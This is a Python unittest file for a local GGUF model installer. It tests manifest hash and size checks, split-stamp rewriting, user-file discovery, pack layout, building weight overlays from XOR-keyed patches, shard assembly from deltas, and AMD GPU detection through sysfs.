"""the installer, without the network: the manifest's checks, a GGUF's split stamp read, written and hashed as
published, the user's files found (by bytes, then SHA-256 - their names free), a pack laid out from them.

    python3 -m unittest tools/install/test_install.py
"""
import hashlib
import json
import os
import struct
import sys
import tempfile
import unittest
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import doctor  # noqa: E402
import layout  # noqa: E402
import overlay_q4x  # noqa: E402
import osmos_install  # noqa: E402
import manifest  # noqa: E402
import host  # noqa: E402
import rig  # noqa: E402
import stamp  # noqa: E402
import userfiles  # noqa: E402

REAL = os.path.join(os.path.dirname(os.path.abspath(__file__)), "packs.json")
REV = "2688c0c3c2c3b052ec4f6d10a8417b0ef7ee4eba"


def gguf(path, no, count, payload):
    """a GGUF v3 of no tensors: split.no (no - 1) and split.count, uint16 each as unsloth's are, then `payload`"""
    def s(t):
        b = t.encode()
        return struct.pack("<Q", len(b)) + b
    head = b"GGUF" + struct.pack("<IQQ", 3, 0, 2)
    head += s("split.no") + struct.pack("<IH", 2, no - 1) + s("split.count") + struct.pack("<IH", 2, count)
    with open(path, "wb") as f:
        f.write(head + payload)


def sha(path):
    with open(path, "rb") as f:
        return hashlib.sha256(f.read()).hexdigest()


def put(path, data):
    with open(path, "wb") as f:
        f.write(data)


def entry(path, repo="r/a", revision=REV, **kw):
    e = {"repo": repo, "revision": revision, "path": "dir/" + os.path.basename(path), "bytes": os.path.getsize(path),
         "sha256": sha(path)}
    e.update(kw)
    return e


RIG_PIN = {"repo": "me/rig", "version": "v1.0.0", "install_sha256": "0" * 64}
ROW = {"id": "t", "max_tokens": 4096, "reserve": 4096, "efforts": ["low", "high"], "effort": "high", "aliases": ["t"]}


class Manifest(unittest.TestCase):
    def test_real(self):
        m = manifest.load(REAL)
        self.assertRegex(m["rig"]["version"], r"^v[0-9]+\.[0-9]+\.[0-9]+$")
        self.assertEqual(set(m["packs"]), {"osmos-evo-a", "ud-iq1_s", "ud-iq1_m", "ud-iq2_xxs", "qwen38-ud-iq3_xxs",
                                           "qwen38-ud-iq3_xxs-1m", "qwen38-ud-q4_k_xl"})
        evo = m["packs"]["osmos-evo-a"]  # osmos's own: UD-IQ1_M's shards with its delta in, made where installed
        self.assertEqual({m["files"][f]["derive"]["with"] for f in evo["shards"]}, {"gguf_assemble"})
        self.assertEqual({tuple(m["files"][f]["derive"]["base"]) for f in evo["shards"]},
                         {tuple(m["packs"]["ud-iq1_m"]["shards"])})
        self.assertEqual((evo["table"], evo["overlay"]), (m["packs"]["ud-iq1_m"]["table"], m["packs"]["ud-iq1_m"]["overlay"]))
        q4 = m["packs"]["qwen38-ud-q4_k_xl"]  # the larger Qwen: its n-gram table streamed to fit, no overlay for it
        self.assertTrue(q4["settings"]["stream_ngram"])
        self.assertIsNone(q4["overlay"])
        self.assertEqual(q4["drafter"], m["packs"]["qwen38-ud-iq3_xxs"]["drafter"])
        q1m = m["packs"]["qwen38-ud-iq3_xxs-1m"]                              # YaRN's: the same files, 4x the context
        self.assertEqual((q1m["shards"], q1m["drafter"]), (m["packs"]["qwen38-ud-iq3_xxs"]["shards"],
                                                           m["packs"]["qwen38-ud-iq3_xxs"]["drafter"]))
        self.assertEqual(q1m["settings"], {"max_context": 1048576})
        self.assertEqual(m["packs"]["ud-iq1_s"]["table"]["slot"], [5, 5])
        for ds in ("ud-iq1_s", "ud-iq1_m"):  # osmos-serve's 2K steps: 4K's +10-18% prompts cost 1-2% drafted, 8K's 6-10%
            self.assertEqual(m["packs"][ds]["settings"], {"no_guess": True, "max_context": 1048576, "max_tokens": 8192})
        x = m["packs"]["ud-iq2_xxs"]  # six files: its own Q5_K Engram (the sixth) not fetched, the MXFP8 table 6 of 6
        self.assertEqual(x["table"]["slot"], [6, 6])
        self.assertEqual([m["files"][f]["bytes"] for f in x["shards"]],
                         [5780923, 49955895008, 49950675200, 48971469632, 16419622240])
        self.assertEqual(x["settings"], {"no_guess": True, "max_context": 1048576, "max_tokens": 8192})  # 0.5.7: off is fastest (DESIGN.md)
        self.assertEqual((x["overlay"], x["drafter"]), ("abl-ud-iq2_xxs", ["drafter-bin", "drafter-json"]))
        q = m["packs"]["qwen38-ud-iq3_xxs"]
        self.assertEqual(q["drafter_kind"], "mtp")                            # its MTP head: one GGUF
        self.assertEqual((q["table"], q["picks"]), (None, None))                 # resident: no table, no picks
        self.assertEqual(q["overlay"], "abl-qwen38-ud-iq3_xxs")                # huihui's, made by overlay_q4x
        ov = m["files"]["abl-qwen38-ud-iq3_xxs"]
        self.assertEqual((ov["derive"]["mode"], ov["derive"]["model"], ov["bytes"]),
                         (2, ["qwen38-iq3xxs-1", "qwen38-iq3xxs-2", "qwen38-iq3xxs-3", "qwen38-iq3xxs-4"], 702879904))
        self.assertEqual(m["files"]["qwen38-abl-patch"]["bytes"], 3561572544)
        self.assertEqual(m["packs"]["qwen38-ud-iq3_xxs-1m"]["overlay"], "abl-qwen38-ud-iq3_xxs")
        self.assertEqual(q["settings"], {"max_context": 262144, "max_tokens": 4096})  # no budget or guess: the family
        # refuses; 4K prompt steps: prompts +5-7%, drafted answers the same (every weight resident), +4 GiB
        self.assertEqual([m["files"][f]["bytes"] for f in q["shards"]],
                         [10946618, 49946027488, 4869325888, 28800138432])

    def refused(self, mutate, why):
        m = json.load(open(REAL))
        mutate(m)
        with self.assertRaisesRegex(manifest.ManifestError, why):
            manifest.check(m)

    def test_refusals(self):
        self.refused(lambda m: m["files"]["ud-iq1_s-2"].update(revision="main"), "pinned")
        self.refused(lambda m: m["files"]["ud-iq1_s-2"].update(sha256="abc"), "sha256")
        self.refused(lambda m: m["files"]["ud-iq1_s-2"].pop("bytes"), "bytes")
        self.refused(lambda m: m["packs"]["ud-iq1_s"]["shards"].append("nope"), "nope")
        self.refused(lambda m: m["packs"]["ud-iq1_s"]["table"].update(slot=[6, 5]), "slot")
        self.refused(lambda m: m["packs"]["ud-iq1_s"].update(shards=[]), "shards")
        self.refused(lambda m: m["rig"].update(version="latest"), "rig")             # a tag, not a moving name
        self.refused(lambda m: m["rig"].update(install_sha256="abc"), "rig")
        self.refused(lambda m: m.pop("rig"), "rig")
        self.refused(lambda m: m.update(version=2), "version")
        q = "qwen38-ud-iq3_xxs"
        self.refused(lambda m: m["packs"][q].update(drafter_kind="eagle"), "drafter_kind")
        self.refused(lambda m: m["packs"][q]["drafter"].append(m["packs"][q]["drafter"][0]), "one")  # mtp: one file
        self.refused(lambda m: m["packs"][q].pop("rig"), "rig")              # every pack its rig row's settings
        self.refused(lambda m: m["packs"][q]["rig"].update(effort="max"), "effort")  # not among its efforts
        self.refused(lambda m: m["packs"][q]["rig"].update(reserve=0), "reserve")


class Stamp(unittest.TestCase):
    def test_read_write_canonical(self):
        with tempfile.TemporaryDirectory() as d:
            a, b = os.path.join(d, "a.gguf"), os.path.join(d, "b.gguf")
            gguf(a, 1, 1, b"table" * 1000)
            gguf(b, 1, 1, b"table" * 1000)
            published = sha(a)
            self.assertEqual(stamp.read(a), (1, 1))
            stamp.write(b, 5, 5)
            self.assertEqual(stamp.read(b), (5, 5))
            self.assertNotEqual(sha(b), published)
            self.assertEqual(stamp.canonical_sha256(b, (1, 1)), published)   # restamped: verifies as published
            self.assertEqual(os.path.getsize(b), os.path.getsize(a))
            with open(b, "r+b") as f:                                       # a payload byte changed: does not
                f.seek(-1, 2)
                f.write(b"X")
            self.assertNotEqual(stamp.canonical_sha256(b, (1, 1)), published)

    def test_no_stamp(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "x.gguf")
            with open(p, "wb") as f:
                f.write(b"GGUF" + struct.pack("<IQQ", 3, 0, 0))
            with self.assertRaises(stamp.StampError):
                stamp.read(p)


class UserFiles(unittest.TestCase):
    def test_found_by_bytes_and_hash(self):
        with tempfile.TemporaryDirectory() as d:
            src = os.path.join(d, "src")
            os.makedirs(os.path.join(src, "deep"))
            want = os.path.join(src, "deep", "renamed.bin")
            put(want, b"shard" * 999)
            decoy = os.path.join(src, "decoy.bin")                     # the same size, other bytes
            put(decoy, b"shard" * 998 + b"XXXXX")
            e = entry(want)
            self.assertEqual(userfiles.find(e, [src]), os.path.realpath(want))
            e2 = dict(e, sha256="0" * 64)
            self.assertIsNone(userfiles.find(e2, [src]))
            self.assertIsNone(userfiles.find(e2, [src], trust_size=True))  # small: hashed whatever the flag
            big = os.path.join(src, "shard.gguf")                          # large (sparse): by its bytes alone
            with open(big, "wb") as f:
                f.truncate(userfiles.TRUST_FROM)
            eb = {"repo": "r/a", "revision": REV, "path": "x/shard.gguf", "bytes": userfiles.TRUST_FROM,
                  "sha256": "0" * 64}
            self.assertEqual(userfiles.find(eb, [src], trust_size=True), os.path.realpath(big))
            self.assertIsNone(userfiles.find(eb, [src]))

    def test_trust_size_still_hashes_small_files(self):
        with tempfile.TemporaryDirectory() as d:
            a, b = os.path.join(d, "a", "osmos-picks.bin"), os.path.join(d, "b", "osmos-picks.bin")
            os.makedirs(os.path.dirname(a))
            os.makedirs(os.path.dirname(b))
            put(a, b"A" * 4096)
            put(b, b"B" * 4096)                                      # the same size: two packs' profiles
            self.assertEqual(userfiles.find(entry(b), [d], trust_size=True), os.path.realpath(b))
            self.assertEqual(userfiles.find(entry(a), [d], trust_size=True), os.path.realpath(a))

    def test_table_restamped_found(self):
        with tempfile.TemporaryDirectory() as d:
            pub = os.path.join(d, "pub.gguf")
            gguf(pub, 1, 1, b"engram" * 2000)
            e = entry(pub, stamp=[1, 1])
            mine = os.path.join(d, "mine", "table-5of5.gguf")
            os.makedirs(os.path.dirname(mine))
            gguf(mine, 5, 5, b"engram" * 2000)
            os.remove(pub)
            self.assertEqual(userfiles.find(e, [os.path.join(d, "mine")]), os.path.realpath(mine))


class Layout(unittest.TestCase):
    def test_pack_from_user_files(self):
        with tempfile.TemporaryDirectory() as d:
            have, models = os.path.join(d, "have"), os.path.join(d, "models")
            os.makedirs(have)
            shards = []
            for i in (1, 2):
                p = os.path.join(have, f"M-0000{i}-of-00003.gguf")
                gguf(p, i, 3, b"w%d" % i * 500)
                shards.append(p)
            table = os.path.join(have, "engram.gguf_file")
            gguf(table, 1, 1, b"t" * 3000)
            picks = os.path.join(have, "osmos-picks.bin")
            put(picks, b"p" * 64)
            table_before = sha(table)
            m = {"version": 1, "rig": RIG_PIN, "files": {
                "s1": entry(shards[0]), "s2": entry(shards[1]), "tab": entry(table, stamp=[1, 1]),
                "pk": entry(picks, repo="me/osmos", revision=None)},
                "packs": {"p": {"title": "t", "shards": ["s1", "s2"], "table": {"file": "tab", "slot": [3, 3]},
                                "picks": "pk", "drafter": [], "overlay": None, "rig": ROW,
                                "settings": {"budget_gib": 110, "no_guess": True}}}}
            manifest.check(m)
            out = layout.lay(m, "p", models, [have], trust_size=False, abliterated=False, fetch=None)
            pack = os.path.join(models, "p")
            self.assertTrue(os.path.islink(os.path.join(pack, "M-00001-of-00003.gguf")))
            t3 = os.path.join(pack, "M-00003-of-00003.gguf")
            self.assertEqual(stamp.read(t3), (3, 3))
            self.assertEqual(sha(table), table_before)                  # the user's table: not written
            self.assertEqual(stamp.canonical_sha256(t3, (1, 1)), table_before)
            with open(os.path.join(pack, "osmos.json")) as f:
                cfg = json.load(f)
            self.assertEqual(cfg["model"], os.path.join(pack, "M-00001-of-00003.gguf"))
            self.assertTrue(cfg["no_guess"] and cfg["picks"].endswith("osmos-picks.bin") and not cfg.get("overlay"))
            self.assertEqual(out, os.path.join(pack, "osmos.json"))

    def test_mtp_pack_from_user_files(self):
        with tempfile.TemporaryDirectory() as d:                # Qwen's shape: no table, no picks, one GGUF drafting
            have, models = os.path.join(d, "have"), os.path.join(d, "models")
            os.makedirs(have)
            shards = []
            for i in (1, 2):
                p = os.path.join(have, f"Q-0000{i}-of-00002.gguf")
                gguf(p, i, 2, b"q%d" % i * 400)
                shards.append(p)
            head = os.path.join(have, "mtp-head.gguf")
            gguf(head, 1, 1, b"h" * 700)
            m = {"version": 1, "rig": RIG_PIN, "files": {"s1": entry(shards[0]), "s2": entry(shards[1]),
                                                         "mtp": entry(head)},
                 "packs": {"q": {"title": "t", "shards": ["s1", "s2"], "table": None, "picks": None,
                                 "drafter": ["mtp"], "drafter_kind": "mtp", "overlay": None, "rig": ROW,
                                 "settings": {"max_context": 262144}}}}
            manifest.check(m)
            layout.lay(m, "q", models, [have], trust_size=False, abliterated=False, fetch=None)
            pack = os.path.join(models, "q")
            with open(os.path.join(pack, "osmos.json")) as f:
                cfg = json.load(f)
            self.assertEqual(cfg["drafter"], os.path.join(pack, "mtp-head.gguf"))   # the file, not a directory
            self.assertEqual(os.path.realpath(cfg["drafter"]), os.path.realpath(head))
            self.assertFalse(os.path.exists(os.path.join(pack, "dspark")))
            self.assertTrue("picks" not in cfg and cfg["max_context"] == 262144)
            self.assertEqual(sorted(os.listdir(pack)), ["Q-00001-of-00002.gguf", "Q-00002-of-00002.gguf",
                                                        "mtp-head.gguf", "osmos.json"])

    def test_missing_unpublished_refused(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "x.bin")
            put(p, b"x")
            m = {"version": 1, "rig": RIG_PIN, "files": {"pk": entry(p, repo="me/osmos", revision=None)},
                 "packs": {"p": {"title": "t", "shards": ["pk"], "table": None, "picks": None, "drafter": [],
                                 "overlay": None, "rig": ROW, "settings": {}}}}
            manifest.check(m)
            with self.assertRaisesRegex(layout.LayoutError, "not published"):
                layout.lay(m, "p", os.path.join(d, "models"), [], trust_size=False, abliterated=False, fetch=None)


def gguf_tensors(path, texts, tensors, align=32):
    """a GGUF v3: string values {key: text} (a model's general.architecture; a later shard's none; a patch's
    general.encrypt_type), then tensors [(name, dims, type, data)] at `align` (as llama.cpp lays them)"""
    def s(t):
        b = t.encode()
        return struct.pack("<Q", len(b)) + b
    if isinstance(texts, str):
        texts = {"general.architecture": texts}
    texts = texts or {}
    kv = b"".join(s(k) + struct.pack("<I", 8) + s(v) for k, v in texts.items())
    head = b"GGUF" + struct.pack("<IQQ", 3, len(tensors), len(texts)) + kv
    info, blob = b"", b""
    for name, dims, ty, data in tensors:
        blob += b"\0" * (-len(blob) % align)
        info += s(name) + struct.pack("<I", len(dims)) + b"".join(struct.pack("<Q", d) for d in dims)
        info += struct.pack("<IQ", ty, len(blob))
        blob += data
    body = head + info
    with open(path, "wb") as f:
        f.write(body + b"\0" * (-len(body) % align) + blob)


def read_tensors(path):
    """{name: (dims, type, data)} of a GGUF v3 - read apart from the converter's own reader"""
    with open(path, "rb") as f:
        b = f.read()
    o = 4 + 4
    n_t, n_kv = struct.unpack_from("<QQ", b, o)
    o += 16
    align = 32

    def take(fmt):
        nonlocal o
        v = struct.unpack_from(fmt, b, o)
        o += struct.calcsize(fmt)
        return v[0] if len(v) == 1 else v

    def text():
        nonlocal o
        n = take("<Q")
        t = b[o:o + n].decode()
        o += n
        return t
    for _ in range(n_kv):
        k, ty = text(), take("<I")
        if ty == 8:
            text()
        elif ty == 4:
            v = take("<I")
            align = v if k == "general.alignment" else align
        else:
            raise AssertionError(f"a value type the test does not read: {ty}")
    infos = []
    for _ in range(n_t):
        name, nd = text(), take("<I")
        dims = [take("<Q") for _ in range(nd)]
        ty, off = take("<I"), take("<Q")
        infos.append((name, dims, ty, off))
    start = o + (-o % align)
    ends = sorted(off for *_, off in infos) + [len(b) - start]
    out = {}
    for name, dims, ty, off in infos:
        nxt = min(e for e in ends if e > off)
        out[name] = (dims, ty, b[start + off:start + nxt])
    return out


PATCH_KV = {"general.abliterated_by": "Huihui.ai", "general.encrypt_type": "xor"}  # the real patch's (no architecture)


class Overlay(unittest.TestCase):
    KEY = b"k3y-text-of-the-patch"

    def xor(self, data):
        return bytes(c ^ self.KEY[i % len(self.KEY)] for i, c in enumerate(data))

    def files(self, d):
        """a two-shard model (three targets of two types, one other) and its patch (each target's variant of its type
        XOR-keyed, a decoy variant of another type, a tensor of no target)"""
        q8 = lambda n: bytes((7 * i + n) & 255 for i in range(68))   # a Q8_0 [32, 2]: 2 blocks of 34
        q6 = lambda n: bytes((5 * i + n) & 255 for i in range(210))  # a Q6_K [256]: 1 block of 210
        model = [os.path.join(d, f"m-0000{i}-of-00002.gguf") for i in (1, 2)]
        gguf_tensors(model[0], "qwen4exp", [("blk.0.ssm_out.weight", [256], 14, q6(1)),
                                            ("blk.0.attn_output.weight", [32, 2], 8, q8(2))])
        gguf_tensors(model[1], None, [("blk.0.ffn_down_shexp.weight", [32, 2], 8, q8(3)),  # unsloth's: no metadata
                                            ("blk.0.ffn_up_shexp.weight", [32, 2], 8, q8(4))])
        self.plain = {"blk.0.ssm_out.weight": q6(11), "blk.0.attn_output.weight": q8(12),
                      "blk.0.ffn_down_shexp.weight": q8(13)}
        patch = os.path.join(d, "patch.gguf")
        gguf_tensors(patch, PATCH_KV, [("blk.0.ssm_out.weight_8", [32, 8], 8, b"\1" * 272),  # another type's, first: not taken
                                         ("blk.0.ssm_out.weight_14", [256], 14, self.xor(self.plain["blk.0.ssm_out.weight"])),
                                         ("blk.0.attn_output.weight_8", [32, 2], 8, self.xor(self.plain["blk.0.attn_output.weight"])),
                                         ("blk.0.ffn_down_shexp.weight_8", [32, 2], 8, self.xor(self.plain["blk.0.ffn_down_shexp.weight"]))])
        key = os.path.join(d, "patch.gguf.key")
        with open(key, "wb") as f:
            f.write(self.KEY + b"\n")
        return model, patch, key

    def test_modes(self):
        want = {0: {"blk.0.ssm_out.weight", "blk.0.ffn_down_shexp.weight"},
                1: {"blk.0.ssm_out.weight", "blk.0.attn_output.weight"},
                2: {"blk.0.ssm_out.weight", "blk.0.attn_output.weight", "blk.0.ffn_down_shexp.weight"}}
        with tempfile.TemporaryDirectory() as d:
            model, patch, key = self.files(d)
            for mode, names in want.items():
                out = os.path.join(d, f"overlay{mode}.gguf")
                overlay_q4x.convert(model, patch, key, mode, out)
                got = read_tensors(out)
                self.assertEqual(set(got), names)
                for n in names:  # the model's dims and type, the patch's bytes un-XORed
                    self.assertEqual(got[n][2][:len(self.plain[n])], self.plain[n])
                self.assertEqual(got["blk.0.ssm_out.weight"][:2], ([256], 14))

    def test_chunks(self):
        """decoded a few bytes at a time (a 7-byte chunk, the key 21): the key runs on across chunks, not from each"""
        with tempfile.TemporaryDirectory() as d:
            model, patch, key = self.files(d)
            was, overlay_q4x._CHUNK = overlay_q4x._CHUNK, 7
            try:
                out = os.path.join(d, "o.gguf")
                overlay_q4x.convert(model, patch, key, 2, out)
                got = read_tensors(out)
                for n, plain in self.plain.items():
                    self.assertEqual(got[n][2][:len(plain)], plain)
            finally:
                overlay_q4x._CHUNK = was

    def test_refusals(self):
        with tempfile.TemporaryDirectory() as d:
            model, patch, key = self.files(d)
            out = os.path.join(d, "o.gguf")
            empty = os.path.join(d, "empty.key")
            open(empty, "wb").close()
            with self.assertRaises(overlay_q4x.OverlayError):
                overlay_q4x.convert(model, patch, empty, 2, out)  # no key
            with self.assertRaises(overlay_q4x.OverlayError):
                overlay_q4x.convert(model, patch, key, 3, out)  # no such mode
            gguf_tensors(patch, PATCH_KV, [("blk.0.ssm_out.weight_8", [32, 2], 8, b"\0" * 68)])
            with self.assertRaises(overlay_q4x.OverlayError):
                overlay_q4x.convert(model, patch, key, 0, out)  # no variant of the model's type
            gguf_tensors(patch, PATCH_KV, [("blk.0.ssm_out.weight_14", [128], 14, b"\0" * 105),
                                             ("blk.0.ffn_down_shexp.weight_8", [32, 2], 8, b"\0" * 68)])
            with self.assertRaises(overlay_q4x.OverlayError):
                overlay_q4x.convert(model, patch, key, 0, out)  # the variant's shape not the model's
            model, patch, key = self.files(d)
            gguf_tensors(patch, {"general.encrypt_type": "aes"}, [])
            with self.assertRaises(overlay_q4x.OverlayError):
                overlay_q4x.convert(model, patch, key, 0, out)  # a scheme this does not read
            model, patch, key = self.files(d)  # a good patch again: only the model's architecture wrong below
            overlay_q4x.convert(model, patch, key, 0, out)
            os.remove(out)
            gguf_tensors(model[0], "deepseek4", [("blk.0.ssm_out.weight", [256], 14, b"\0" * 210)])
            with self.assertRaises(overlay_q4x.OverlayError):
                overlay_q4x.convert(model, patch, key, 0, out)  # not a qwen4exp model
            self.assertFalse(os.path.exists(out))  # nothing left of a refused conversion


class Derived(unittest.TestCase):
    """an overlay made from two published files (huihui's patch and key) and the pack's shards by the converter, its
    bytes and SHA-256 pinned as a download's are"""

    def setup(self, d):
        have, models = os.path.join(d, "have"), os.path.join(d, "models")
        os.makedirs(have)
        model, patch, key = Overlay().files(have)
        made = os.path.join(d, "made.gguf")
        overlay_q4x.convert(model, patch, key, 2, made)
        m = {"version": 1, "rig": RIG_PIN,
             "files": {"s1": entry(model[0]), "s2": entry(model[1]), "patch": entry(patch, repo="h/p"),
                       "key": entry(key, repo="h/p"),
                       "abl": {"derive": {"with": "overlay_q4x", "patch": "patch", "key": "key",
                                          "model": ["s1", "s2"], "mode": 2},
                               "path": "q-abliterated-overlay.gguf", "bytes": os.path.getsize(made),
                               "sha256": sha(made)}},
             "packs": {"q": {"title": "t", "shards": ["s1", "s2"], "table": None, "picks": None, "drafter": [],
                             "overlay": "abl", "rig": ROW, "settings": {}}}}
        return have, models, m, made

    def test_laid(self):
        with tempfile.TemporaryDirectory() as d:
            have, models, m, made = self.setup(d)
            manifest.check(m)
            ids = osmos_install.needed(m, ["q"], True)  # the inputs fetched, never the derived file
            self.assertEqual(ids, ["s1", "s2", "patch", "key"])
            cfg = layout.read_config(layout.lay(m, "q", models, [have], trust_size=False, abliterated=True, fetch=None))
            self.assertEqual(cfg["overlay"], os.path.join(models, "q", "q-abliterated-overlay.gguf"))
            self.assertEqual(sha(cfg["overlay"]), sha(made))
            self.assertNotIn("overlay", layout.read_config(layout.lay(m, "q", models, [have], trust_size=False,
                                                                      abliterated=False, fetch=None)))

    def test_refused(self):
        with tempfile.TemporaryDirectory() as d:
            have, models, m, _ = self.setup(d)
            m["files"]["abl"]["sha256"] = "0" * 64  # another result than pinned: refused, nothing left of it
            with self.assertRaises(layout.LayoutError):
                layout.lay(m, "q", models, [have], trust_size=False, abliterated=True, fetch=None)
            self.assertFalse(os.path.exists(os.path.join(models, "derived", "q-abliterated-overlay.gguf")))
            bad = [("with", "xor_all"), ("patch", "nope"), ("key", "abl"), ("mode", 7)]
            for k, v in bad:
                mm = json.loads(json.dumps(m))
                mm["files"]["abl"]["derive"][k] = v
                with self.assertRaises(manifest.ManifestError, msg=f"derive {k} {v!r}"):
                    manifest.check(mm)
            mm = json.loads(json.dumps(m))
            mm["files"]["abl"]["repo"] = "h/p"  # derived, not downloaded: no repo
            with self.assertRaises(manifest.ManifestError):
                manifest.check(mm)


class DerivedSet(unittest.TestCase):
    """a pack's shards made from a published base set and a delta (gguf_assemble), each pinned by its SHA-256"""

    def setup(self, d):
        sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "convert"))
        import gguf_assemble as A
        import gguf_delta as D
        have, models = os.path.join(d, "have"), os.path.join(d, "models")
        os.makedirs(have)
        mk = Assemble().gguf
        a, c = os.urandom(256), os.urandom(4096 * 2 + 64)
        mk(f"{have}/b-00001-of-00002.gguf", [("a", [64], 0, a)])
        mk(f"{have}/b-00002-of-00002.gguf", [("c", [len(c) // 4], 0, c)])
        os.makedirs(f"{d}/t")  # the target: c changed, its own name
        name = struct.pack("<Q", 12) + b"general.name" + struct.pack("<IQ", 8, 3) + b"evo"
        mk(f"{d}/t/t-00001-of-00002.gguf", [("a", [64], 0, a)], extra_kv=name, n_extra=1)
        mk(f"{d}/t/t-00002-of-00002.gguf", [("c", [len(c) // 4], 0, os.urandom(len(c)))])
        delta = f"{have}/delta.gguf"
        D.main.__globals__["sys"].argv = ["x", f"{d}/t/t-00001-of-00002.gguf", f"{have}/b-00001-of-00002.gguf", delta]
        D.main()
        os.makedirs(f"{d}/made")
        made = A.assemble([f"{have}/b-00001-of-00002.gguf", f"{have}/b-00002-of-00002.gguf"],
                          [f"{d}/made/e-00001-of-00002.gguf", f"{d}/made/e-00002-of-00002.gguf"], [delta], log=lambda m: None)
        derived = lambda k, p: {"derive": {"with": "gguf_assemble", "base": ["b1", "b2"], "delta": "delta", "shard": k},  # noqa: E731
                                "path": os.path.basename(p), "bytes": os.path.getsize(p), "sha256": sha(p)}
        m = {"version": 1, "rig": RIG_PIN,
             "files": {"b1": entry(f"{have}/b-00001-of-00002.gguf"), "b2": entry(f"{have}/b-00002-of-00002.gguf"),
                       "delta": entry(delta, repo="o/evo"), "e1": derived(1, made[0]), "e2": derived(2, made[1])},
             "packs": {"e": {"title": "t", "shards": ["e1", "e2"], "table": None, "picks": None, "drafter": [],
                             "overlay": None, "rig": ROW, "settings": {}}}}
        return have, models, m, made

    def test_laid(self):
        with tempfile.TemporaryDirectory() as d:
            have, models, m, made = self.setup(d)
            manifest.check(m)
            self.assertEqual(osmos_install.needed(m, ["e"], False), ["b1", "b2", "delta"])  # the inputs, never the made
            cfg = layout.read_config(layout.lay(m, "e", models, [have], trust_size=False, abliterated=False, fetch=None))
            self.assertEqual(sha(cfg["model"]), sha(made[0]))
            self.assertEqual(sha(os.path.join(models, "e", "e-00002-of-00002.gguf")), sha(made[1]))

    def test_refused(self):
        with tempfile.TemporaryDirectory() as d:
            have, models, m, _ = self.setup(d)
            m["files"]["e2"]["sha256"] = "0" * 64  # one file of the set not as pinned: refused, none of the set left
            with self.assertRaises(layout.LayoutError):
                layout.lay(m, "e", models, [have], trust_size=False, abliterated=False, fetch=None)
            self.assertEqual(os.listdir(os.path.join(models, "derived")), [])
            for k, v in (("shard", 3), ("shard", 0), ("delta", "e1"), ("base", ["b1", "nope"]), ("base", [])):
                mm = json.loads(json.dumps(m))
                mm["files"]["e1"]["derive"][k] = v
                with self.assertRaises(manifest.ManifestError, msg=f"derive {k} {v!r}"):
                    manifest.check(mm)


class Host(unittest.TestCase):
    def test_tools_named_before_anything_runs(self):
        have = {"git", "make", "gcc", "hipcc", "hf"}
        which = lambda n: f"/usr/bin/{n}" if n in have else None          # noqa: E731
        self.assertTrue(host.tools(True, True, which, lambda p: False)[0])
        have.discard("hf")
        ok, why = host.tools(True, True, which, lambda p: False)
        self.assertFalse(ok)
        self.assertIn("hf", why)                                         # a download needs it: named first
        self.assertTrue(host.tools(False, True, which, lambda p: False)[0])    # every file the user's: not needed
        have.discard("hipcc")
        ok, why = host.tools(False, True, which, lambda p: False)
        self.assertFalse(ok)
        self.assertIn("hipcc", why)
        self.assertTrue(host.tools(False, True, which, lambda p: p == "/opt/rocm/bin/hipcc")[0])  # ROCm's own path
        self.assertTrue(host.tools(False, False, which, lambda p: False)[0])  # --no-build: no build tools


class Gpu(unittest.TestCase):
    """the GPU found by its PCI ids in sysfs (no ROCm needed: issue #25 - rocminfo's probe hung on a box without one)"""

    def tree(self, devices):
        root = tempfile.mkdtemp()
        os.makedirs(os.path.join(root, "bus", "pci", "devices"))
        for i, (vendor, device) in enumerate(devices):
            d = os.path.join(root, "bus", "pci", "devices", f"0000:c{i}:00.0")
            os.mkdir(d)
            for name, v in (("vendor", vendor), ("device", device)):
                with open(os.path.join(d, name), "w") as f:
                    f.write(v + "\n")
        return root

    def test_found(self):
        ok, why = host.gpu(self.tree([("0x8086", "0x1234"), ("0x1002", "0x1586")]))
        self.assertTrue(ok, why)
        self.assertIn("gfx1151", why)

    def test_refused(self):
        for devices, needle in (([("0x1002", "0x744c")], "1002:744c"),  # a discrete Radeon: named, refused
                                ([("0x10de", "0x2684")], "no AMD GPU"), ([], "no AMD GPU")):
            ok, why = host.gpu(self.tree(devices))
            self.assertFalse(ok, why)
            self.assertIn(needle, why)
        ok, why = host.gpu("/nonexistent")
        self.assertFalse(ok)
        self.assertIn("sysfs", why)


class Assemble(unittest.TestCase):
    """tools/convert/gguf_assemble.py: a GGUF set with tensors replaced - the others' bytes and their offset modulo a
    block kept (clones where the filesystem has them), a shard with nothing replaced linked"""

    def gguf(self, path, tensors, extra_kv=b"", n_extra=0):
        def s(x):
            b = x.encode()
            return struct.pack("<Q", len(b)) + b
        kv = s("general.alignment") + struct.pack("<II", 4, 32) + extra_kv
        info, data, off = b"", b"", 0
        for name, dims, ty, raw in tensors:
            info += s(name) + struct.pack("<I", len(dims)) + struct.pack(f"<{len(dims)}Q", *dims) + struct.pack("<IQ", ty, off)
            data += raw + b"\0" * ((-len(raw)) % 32)
            off += len(raw) + (-len(raw)) % 32
        hd = b"GGUF" + struct.pack("<IQQ", 3, len(tensors), 1 + n_extra) + kv + info
        with open(path, "wb") as f:
            f.write(hd + b"\0" * ((-len(hd)) % 32) + data)

    def test_assemble(self):
        sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "convert"))
        import gguf_assemble as A
        d = tempfile.mkdtemp()
        big = os.urandom(3 * 4096 + 100)  # F32 [(3 * 4096 + 100) / 4]: whole blocks and edges
        a = os.urandom(64 * 4)
        self.gguf(f"{d}/m-00001-of-00002.gguf", [("a", [64], 0, a), ("big", [len(big) // 4], 0, big)])
        self.gguf(f"{d}/m-00002-of-00002.gguf", [("c", [64], 0, os.urandom(256))])
        self.gguf(f"{d}/r.gguf", [("a", [64], 8, os.urandom(34 * 2))])  # a as Q8_0: 2 blocks
        out = os.path.join(d, "out")
        A.main.__globals__["sys"].argv = ["x", f"{d}/m-00001-of-00002.gguf", out, f"{d}/r.gguf"]
        A.main()
        _, _, _, _, got = A.read_shard(f"{out}/m-00001-of-00002.gguf")
        names = {t[0]: t for t in got}
        self.assertEqual(names["a"][2], 8)  # the replacement's type
        with open(f"{out}/m-00001-of-00002.gguf", "rb") as f:
            f.seek(names["big"][3]); self.assertEqual(f.read(len(big)), big)
        _, _, _, _, base = A.read_shard(f"{d}/m-00001-of-00002.gguf")
